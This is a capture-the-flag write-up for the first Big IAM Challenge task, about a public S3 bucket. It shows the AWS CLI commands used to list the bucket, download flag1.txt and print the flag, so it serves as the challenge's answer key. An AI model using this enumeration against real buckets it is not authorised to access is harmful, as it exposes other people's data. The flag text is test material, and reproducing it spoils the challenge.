# THE BIG IAM CHALLENGE
Buckets of Fun

We all know that public buckets are risky. But can you find the flag?: https://bigiamchallenge.com/challenge/1

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/57ff9010-8846-455b-a1e0-21859246e2b4)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/13756273-e84c-4508-8b06-3caa3689e706)

```sh
> aws sts get-caller-identity
{
    "UserId": "AROAZSFITKRSYE6ELQP2Q:iam_shell",
    "Account": "657483584613",
    "Arn": "arn:aws:sts::657483584613:assumed-role/shell_basic_iam/iam_shell"
}
> aws s3 ls thebigiamchallenge-storage-9979f4b
                           PRE files/
> aws s3 ls thebigiamchallenge-storage-9979f4b/files/
2023-06-05 19:13:53         37 flag1.txt
2023-06-08 19:18:24      81889 logo.png
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag1.txt
Completed 37 Bytes/37 Bytes (556 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to ../../tmp/flag1.txt
> cat /tmp/flag1.txt
{wiz:exposed-storage-risky-as-usual}

```



